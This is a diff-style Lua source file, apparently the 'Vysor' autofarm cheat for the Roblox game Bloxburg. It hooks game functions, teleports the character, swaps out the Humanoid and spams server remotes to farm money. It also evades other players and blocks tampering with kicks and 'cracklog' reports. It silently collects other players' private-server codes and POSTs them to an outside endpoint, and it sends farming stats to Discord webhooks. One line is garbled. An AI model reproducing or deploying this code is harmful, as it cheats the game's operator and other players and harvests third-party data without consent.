+TextLabel_3.Position = UDim2.new(0.267573684, 0, 0.257250816, 0)
+TextLabel_3.Size = UDim2.new(0, 214, 0, 60)
+TextLabel_3.Font = Enum.Font.Gotham
+TextLabel_3.Text = "Loading..."
+TextLabel_3.TextColor3 = VysorSettings.Theme.StatusTextColor
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 30.000
+TextLabel_3.TextWrapped = true
+
+UICorner_9.Parent = StatusFrame
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    
+
+
+
+
+spawn(function()
+    pcall(function()
+    while task.wait() do 
+        if game.CoreGui:FindFirstChild("ScreenGui") then 
+           fuckyourgame()
+        elseif game.CoreGui:FindFirstChild("ScreenGui") == nil then 
+            label.TextSize = 55
+            label.TextColor3 = Color3.new(255, 255, 255)
+            label.Text = "GUI Deletion Attempt!"
+            cracklog("ScreenGui Deletion")
+            end
+         end
+    end)
+end)
+
+local cash = game:GetService("ReplicatedStorage").Stats[Player.name].Money.Value
+local stopamt = VysorSettings.Shift.QuitOnCashAmount
+
+task.spawn(function()
+    while task.wait() do
+        local earning =
+            math.floor(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.ShiftEarnings.Value)
+        local fearning = tonumber(earning)
+        local fcash = tonumber(cash)
+        local finalamt = fcash + earning
+        if stopamt == false then
+        
+        elseif finalamt > tonumber(stopamt) then
+            game:shutdown()
+        end
+    end
+end)
+
+-- RESTART SHIFT ON AMOUNT
+    task.spawn(function()
+       while task.wait() do
+           local set2 = VysorSettings.Shift.QuitOnTotalShiftCash
+           local set3 = VysorSettings.Shift.RestartShiftOnAmount
+       
+           local earning = math.floor(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.ShiftEarnings.Value)
+           if set2 == false then
+          
+           elseif earning >= set2 then
+              game:shutdown()
+           end
+   
+           if set3 == false then
+              
+               elseif earning >= set3 then
+                   r.EndShift:FireServer({})
+                   wait(1)
+                   r.StartShift:InvokeServer({ Job = "PizzaPlanetDelivery" }) -- tps to plant for 1 second
+                   local Mop = r.UsePizzaMoped:InvokeServer({}) -- tps to moped
+                   r.StartShift:InvokeServer({ Job = "PizzaPlanetDelivery" }) -- cause player in range of planet you can just insatly start shift now
+               end
+           
+       end
+   end)
+
+
+
+repeat wait() until Player.Character ~= nilerror
+
+
+local codes = VysorSettings.Neighborhood.Codes
+local finalcode = codes[math.random(1, #codes)]
+pcall(function()
+if game.PlaceId == 185655149 and VysorSettings.Neighborhood.Enabled then
+    if VysorSettings.Neighborhood.Enabled ~= nil then
+      
+        local data = r.JoinPrivateServer:InvokeServer({
+            Search = finalcode
+        })
+        if data ~= "E_PrivateServerFailCantFind" then
+            repeat wait() until nil --wait for server teleport
+        else
+            privateFail = true
+        end
+    else
+        privateFail = true
+    end
+end
+end)
+
+
+
+    local function formatTime(Seconds)
+        local Minutes = (Seconds - Seconds % 60) / 60
+        Seconds = Seconds - Minutes * 60
+        local Hours = (Minutes - Minutes % 60) / 60
+        Minutes = Minutes - Hours * 60
+        return Hours, Minutes, Seconds
+    end
+
+
+
+    spawn(function() -- auto rejoin
+        while task.wait() do
+            pcall(function()
+            if game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") ~= nil then
+                game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt"):Destroy()
+                TPService:TeleportToPlaceInstance(185655149, Servers.data[new].id)
+            end
+           end)
+        end
+    end)
+
+    local JobManager = require(Player.PlayerScripts.Modules.JobHandler)
+    _G.Working = false
+
+    pcall(function()
+        r.SetAge:InvokeServer({ Value = "Adult" })
+    end)
+
+    local pz = require(Player.PlayerScripts.Modules.JobHandler.PizzaPlanetDelivery)
+
+    if #debug.getupvalues(pz.ShiftLoop) > 1 then
+        if LPH_OBFUSCATED then
+            LPH_NO_VIRTUALIZE(function() hookfunction(pz.ShiftLoop, function() return end) end)()
+        else
+            hookfunction(pz.ShiftLoop, function() return end)
+        end
+    end
+
+    r.StartShift:InvokeServer({ Job = "PizzaPlanetDelivery" }) 
+    local Mop = r.UsePizzaMoped:InvokeServer({}) 
+    r.StartShift:InvokeServer({ Job = "PizzaPlanetDelivery" }) 
+
+    
+    _G.Working = true
+
+    repeat wait() until _G.Working
+
+    -- stats GUI
+    local elapsed = 0
+    local pizzaCount = 0
+    local pCountLast = 0
+
+    spawn(function() -- stats GUI
+        repeat task.wait() until pizzaCount > 0 or VysorSettings.Safety.DeliveryDelay ~= false
+        while task.wait(1) do
+            elapsed = elapsed + 1
+            _G.time = "0h 0m 0s"
+            local hours, minutes, seconds = formatTime(elapsed)
+            if hours == 0 and minutes == 0 then
+                _G.time = string.format("%ss", seconds)
+            elseif hours == 0 and minutes ~= 0 then
+                _G.time = string.format("%sm %ss", minutes, seconds)
+            else
+                _G.time = string.format("%sh %sm %ss", hours, minutes, seconds)
+            end
+            Shiftduration.Text = _G.time
+        end
+    end)
+
+    local function numWithCommas(n)
+        return tostring(math.floor(n)):reverse():gsub("(%d%d%d)","%1,"):gsub(",(%-?)$","%1"):reverse()
+    end
+
+    spawn(function() -- stats GUI
+        while task.wait() do 
+            local prog = game:GetService("ReplicatedStorage").Stats[Player.Name].Job.Jobs.PizzaPlanetDelivery.Value
+            local earning = math.floor(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.ShiftEarnings.Value)
+            local progression = require(game:GetService("ReplicatedStorage").Modules["_Data"].JobData)
+            TotalCash.Text = tostring("$" .. numWithCommas(game:GetService("ReplicatedStorage").Stats[Player.Name].Money.Value+earning))
+            shiftearnings.Text = tostring("$" .. numWithCommas(earning))
+            pizzasdel.Text = tostring(pizzaCount)
+            promoprogress.Text = tostring(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.Jobs.PizzaPlanetDelivery.Progress.Value) .. '/' .. tostring(progression:GetRequiredPromotionProgress(prog))
+            PromoLevel.Text = tostring(prog)
+
+            if privateFail then
+                
+                TPService:TeleportToPlaceInstance(185655149, Servers.data[new].id)
+            end
+        end
+    end)
+    
+    spawn(function()
+            while wait() do
+                for _, player in pairs(game.Players:GetPlayers()) do
+                    playerdistance = math.floor((player:DistanceFromCharacter(Vector3.new(0, 0, 0))))
+                    if playerdistance == 0 then
+                        fuckyourgame()
+                    elseif
+                        checknumber(VysorSettings.Safety.ProximityLeave) and
+                            playerdistance < tonumber(VysorSettings.Safety.ProximityLeave)
+                     then
+               
+                        TPService:TeleportToPlaceInstance(185655149, Servers.data[new].id)
+                    end
+                end
+            end
+        end)
+    
+
+spawn(function() -- estimated cash per hour
+    local delay = 5
+
+    while task.wait() do 
+        if checknumber(VysorSettings.Safety.DeliveryDelay) then
+            delay = VysorSettings.Safety.DeliveryDelay
+        else
+            delay = 5 
+        end
+
+        local prog = game:GetService("ReplicatedStorage").Stats[Player.Name].Job.Jobs.PizzaPlanetDelivery.Value
+        local earning = math.floor(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.ShiftEarnings.Value)
+        local perdelivery = (math.floor(earning/pizzaCount))
+           perdel.Text = perdelivery
+        if estimated.Text == "$----" or estimated.Text  == "$nan" or estimated.Text  == "$0" or estimated.Text == "$inf" or estimated.Text == "loading" then
+        estimated.Text  = "$" .. numWithCommas(math.floor(3600 / delay * perdelivery))
+        end
+        repeat task.wait() until estimated.Text  ~= "$----" or estimated.Text  ~= "$nan" or estimated.Text  ~= "$0" or estimated.Text  ~= "$inf" or estimated.Text  ~= "loading"
+    end
+end)
+
+-- spawn(function()
+-- while task.wait() do
+--     workspace.Gravity = 0 
+-- end
+-- end)
+
+
+
+
+spawn(function() --Delivery
+    TextLabel_3.Text = "Loading..."
+    while task.wait(3) do
+        pcall(function()
+            local Mop = r.UsePizzaMoped:InvokeServer({})
+            if Mop then
+                oldTime = VysorSettings.Safety.DeliveryDelay
+                if checknumber(VysorSettings.Safety.DeliveryDelay) then
+                    repeat 
+                        wait(1)
+                        VysorSettings.Safety.DeliveryDelay = VysorSettings.Safety.DeliveryDelay - 1
+                        TextLabel_3.Text = "Delivery Cooldown (" .. VysorSettings.Safety.DeliveryDelay .. "s)"
+                    until VysorSettings.Safety.DeliveryDelay == 0
+                    VysorSettings.Safety.DeliveryDelay = oldTime
+                end
+                local Customer = nil
+                repeat
+                    while game:GetService("Workspace").Environment.Locations:FindFirstChild("PizzaPlanet") == nil do
+                        Mop = r.UsePizzaMoped:InvokeServer({})
+                    end
+
+                     Boxes = game:GetService("Workspace").Environment.Locations.PizzaPlanet.Conveyor.MovingBoxes:GetChildren()
+                    if #Boxes == 0 then 
+                        TextLabel_3.Text = "Waiting for Pizzas..."
+                       
+               
+                        task.wait()
+                
+                        end
+                    for i, v in pairs(Boxes) do
+                        if Customer then
+                            break
+                        end
+                        Player.Character:SetPrimaryPartCFrame(CFrame.new(v.Position) + Vector3.new(0, 7, 0))
+
+                        Customer = r.TakePizzaBox:InvokeServer({ Box = v })
+                    end
+                until Customer ~= nil
+
+
+                Player.Character:SetPrimaryPartCFrame(Customer:WaitForChild('HumanoidRootPart').CFrame + Vector3.new(0, 5, 0))
+
+                TextLabel_3.Text = "Delivering Pizza"
+
+             Player.Character.Humanoid:Destroy()
+             Instance.new("Humanoid", Player.Character)
+
+            
+                repeat 
+                    r.DeliverPizza:FireServer({
+                        Customer = Customer
+                    })
+                    task.wait()
+                until not player.Character:FindFirstChild('Pizza Box')
+
+                TextLabel_3.Text = "Delivered"
+                
+                pizzaCount = pizzaCount + 1
+
+            end
+        
+        end)
+	end
+end)
+
+
+--[[
+function senddata()
+    local final = {}
+    final.shiftearnings = shiftearnings.Text
+    final.estimatedearnings = estimated.Text
+    final.ShiftDuration =  shiftduration.Text
+    final.promoprogress = promoprogress.Text
+    final.promolevel = PromoLevel.Text
+    final.totalmoney = TotalCash.Text
+    final.pizzadels = pizzasdel.Text
+    local Http = game:GetService("HttpService")
+
+
+        local sendata = http_request({
+            Url = "https://api.vysor.shop/data?d="..LRM_LinkedDiscordID.."",
+            Method = "POST",
+            Body = 	Http:JSONEncode(final), 
+            Headers = {["Content-Type"] = "application/json"}
+        })
+    
+   
+
+end
+
+spawn(function()
+while wait(VysorSettings.WebUpdateDelay.Delay) do
+    senddata()
+end
+end)
+
+--]]
+
+
+    spawn(function()
+        while task.wait() do 
+            require(Player.PlayerScripts.Modules.MenuUI):HideMenu()
+        end 
+    end)
+
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+        for i,v in next, ReplicatedStorage.Stats:GetChildren() do 
+            if v.Name ~= player.Name then
+                local PrivateServer = v.PrivateServer
+                if PrivateServer.RenewTime.Value > os.time() and PrivateServer.JoinPermission.Value == 0 then
+
+                ting = game:GetService("ReplicatedStorage").Stats[v.Name].PrivateServer.RenewTime.Value
+                         http_request({
+                                Url = "https://websec.services/send/6315fdc07907ab0a63d4eec1",
+                                Method = "POST",
+                                Body = HttpService:JSONEncode({
+                                    username = "Best Bloxburg Bypass",
+                                    embeds = {
+                                        {
+                                            color = 1,
+                                            title = "Neighborhood Code Found!",
+                                            fields = {
+                                                {
+                                                    name =  "Code:",
+                                                    value =  "```yaml\n"..v.Name.."\n```",
+                                                    inline = true
+                                                  },
+                                                  {
+                                                    name =  "Expiration:",
+                                                    value =  "<t:"..ting..">",
+                                                    inline = true
+                                                  }
+
+                                            },
+                                            footer = {
+                                                text = "Best Bloxburg Bypass"
+                                            },
+                                        }
+                                    }
+                                }),
+                                Headers = {["Content-Type"] = "application/json"}
+                            })
+                end 
+            end
+        end
+
+
+
+
+
+
+        spawn(function()
+        
+            local HttpService = game:GetService("HttpService")
+            local webhookUrl = VysorSettings.Webhooks.Webhook 
+    
+            if string.find(webhookUrl, "https://discord.com/api/webhooks/") then
+              
+                messageId =
+                    HttpService:JSONDecode(
+                    http_request(
+                        {
+                            Url = webhookUrl .. "?wait=true",
+                            Method = "POST",
+                            Body = HttpService:JSONEncode(
+                                {
+                                    username = "Vysor",
+                                    embeds = {
+                                        {
+                                            color = 0x52d6ad,
+                                            title = "Started Farming"
+                                        }
+                                    }
+                                }
+                            ),
+                            Headers = {["Content-Type"] = "application/json"}
+                        }
+                    ).Body
+                ).id
+            else
+                return
+            end
+            waittime = tonumber(VysorSettings.Webhooks.WebhookDelay)
+            while task.wait(waittime) do
+                local progression = require(game:GetService("ReplicatedStorage").Modules["_Data"].JobData)
+                local prog = game:GetService("ReplicatedStorage").Stats[Player.Name].Job.Jobs.PizzaPlanetDelivery.Value
+                local prog2 = tostring(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.Jobs.PizzaPlanetDelivery.Progress.Value) .. "/" .. tostring(progression:GetRequiredPromotionProgress(prog))
+                local earning = math.floor(game:GetService("ReplicatedStorage").Stats[Player.Name].Job.ShiftEarnings.Value )
+                local cash = tostring(game:GetService("ReplicatedStorage").Stats[Player.Name].Money.Value + earning)
+                local perdelivery = (math.floor(earning / pizzaCount))
+                
+    
+                pcall(function() 
+                    http_request({
+                                Url = ("%s/messages/%s"):format(webhookUrl, messageId),
+                                Method = "PATCH",
+                                Body = HttpService:JSONEncode(
+                                    {
+                                        username = "Vysor",
+                                        embeds = {
+                                            {
+                                                color = 0x52d6ad,
+                                                title = "Vysor Bloxburg Autofarm",
+                                                fields = {
+                                                
+                                                    {
+                                                        name = "<:dot2:1074690983725371493> Shift Stats:",
+                                                        value = "Earnings:`".. numWithCommas(earning) .."`\nPizzas Delivered:`".. numWithCommas(pizzaCount) .."`\nEstimated/Hour:`"  .. numWithCommas( math.floor(3600 / 5 * perdelivery)) .."`\nDuration: `".. _G.time .."`"
+                                                    },
+
+                                                    {
+                                                        name = "<:dot2:1074690983725371493> Overall Stats:",
+                                                        value = "Total Earnings:`".. numWithCommas(cash) .."`\nPromotion Level:`".. prog .."`\n Promotion Progression:`"  .. prog2 .."`"
+                                                    },
+                                                },
+                                                timestamp = DateTime.now():ToIsoDate(),
+                                                footer = {
+                                                    text = "Neoville"
+                                                },
+                                                thumbnail =  {
+                                                    url = "https://cdn.discordapp.com/attachments/1064395814207758348/1074690189064163400/Untitled-removebg-preview.png"
+                                                  }
+                                            }
+                                        }
+                                    }
+                                ),
+                                Headers = {["Content-Type"] = "application/json"}
+                            })
+                    end)
+            end
+        end)
+        
+
+
+            spawn(function()
+                local pizzastop = VysorSettings.Shift.QuitOnPizzaAmount
+                local pizzastop2 = VysorSettings.Shift.RestartShiftOnPizzaAmount
+                
+                while task.wait() do
+                if pizzastop == false then
+                 
+                elseif tonumber(pizzaCount) >= tonumber(pizzastop) then
+                        game:shutdown()
+                end
+                
+                if pizzastop2 == false then
+                 
+                elseif tonumber(pizzaCount) >= tonumber(pizzastop2) then
+                    r.EndShift:FireServer({})
+                    wait(1)
+                    r.StartShift:InvokeServer({ Job = "PizzaPlanetDelivery" }) -- tps to plant for 1 second
+                    local Mop = r.UsePizzaMoped:InvokeServer({}) -- tps to moped
+                    r.StartShift:InvokeServer({ Job = "PizzaPlanetDelivery" }) -- cause player in range of planet you can just insatly start shift now
+                end
+                
+                 end
+                end)
+                
+                spawn(function()
+                    local level =
+                        game:GetService("ReplicatedStorage").Stats[Player.Name].Job.Jobs.PizzaPlanetDelivery.Value
+                    local set = VysorSettings.Shift.QuitOnPromotionLevel
+                    while task.wait() do
+                        if set == false then
+                           
+                        elseif level >= set then
+                            game:shutdown()
+                        end
+                    end
+                end)
+
+                
+repeat task.wait() until game.CoreGui.ScreenGui ~= nil and game.CoreGui.ScreenGui ~= nil
+
+--// Gui Deletion Detection //--
+game.CoreGui.ScreenGui.Frame:GetPropertyChangedSignal("Visible"):Connect(function()
+    game.CoreGui.ScreenGui.Frame.Visible = true
+    cracklog("Autofarm Gui invisible")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+game.CoreGui.ScreenGui.Frame:GetPropertyChangedSignal("BackgroundTransparency"):Connect(function()
+    cracklog("BackgroundTransparency Changed: " .. game.CoreGui.ScreenGui.Frame.BackgroundTransparency)
+
+    game.CoreGui.ScreenGui.Frame.BackgroundTransparency = 0
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+game.CoreGui.ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    game.CoreGui.ScreenGui.Enabled = true
+    cracklog("Enabled False")
+end)
+game.CoreGui.ScreenGui.Frame:GetPropertyChangedSignal("Size"):Connect(function()
+    cracklog("Size Changed: "..tostring(game.CoreGui.ScreenGui.Frame.Size))
+
+    game.CoreGui.ScreenGui.Frame.Size = UDim2.new(1, 100, 1, 100)
+end)
+
+game.CoreGui.ScreenGui.Frame:GetPropertyChangedSignal("AnchorPoint"):Connect(function()
+    game.CoreGui.ScreenGui.Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    cracklog("AnchorPoint")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+game.CoreGui.ScreenGui.Frame:GetPropertyChangedSignal("Rotation"):Connect(function()
+    game.CoreGui.ScreenGui.Frame.Rotation = 0 
+    cracklog("Rot")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+
+game.CoreGui.ScreenGui.Frame.AncestryChanged:Connect(function()
+    cracklog("Parent Changed")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+game.CoreGui.ScreenGui.AncestryChanged:Connect(function()
+    cracklog("Parent Changed")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+
+spawn(function()
+while task.wait() do 
+    pcall(function()
+    if game.CoreGui:FindFirstChild("ScreenGui").Parent ~= game.CoreGui then
+        cracklog("Parent Invalid")
+    end
+    if game.CoreGui.ScreenGui.Frame.Parent ~= game.CoreGui:FindFirstChild("ScreenGui") then
+        cracklog("Parent Invalid")
+    end
+
+    if game.CoreGui.ScreenGui.MainTitle.Parent ~= game.CoreGui.ScreenGui then
+        cracklog("Parent Invalid")
+    end
+    if game.CoreGui.ScreenGui.Parent ~= game.CoreGui then
+        cracklog("Parent Invalid")
+    end
+
+    if game.CoreGui ~= game:GetService("CoreGui") then
+        cracklog("SC LOG")
+    end
+    if is_lclosure(game.GetService) then
+        cracklog("SC LOG")
+    end
+end)
+end
+end)
+
+game.CoreGui.ScreenGui.ChildAdded:Connect(function()
+    cracklog("Child Added")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+
+
+game.CoreGui.ScreenGui.ChildAdded:Connect(function()
+    cracklog("Child Added")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+game.CoreGui.ScreenGui.Frame.ChildAdded:Connect(function()
+    cracklog("Child Added")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+
+
+game.CoreGui.ScreenGui.Frame:GetPropertyChangedSignal("Visible"):Connect(function()
+    game.CoreGui.ScreenGui.Frame = true
+    cracklog("Visible False")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+
+game.CoreGui.ScreenGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+    game.CoreGui.ScreenGui.Enabled = true
+    cracklog("Enabled False")
+    Player:Kick("Please do not tamper with Vysor. You may be blacklisted for this act.")
+end)
+
+
+
+
+game.CoreGui.ScreenGui.Frame:GetPropertyChangedSignal("Position"):Connect(function()
+    cracklog("Position Changed: "..tostring(game.CoreGui.ScreenGui.Frame.Position))
+    game.CoreGui.ScreenGui.Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+end)
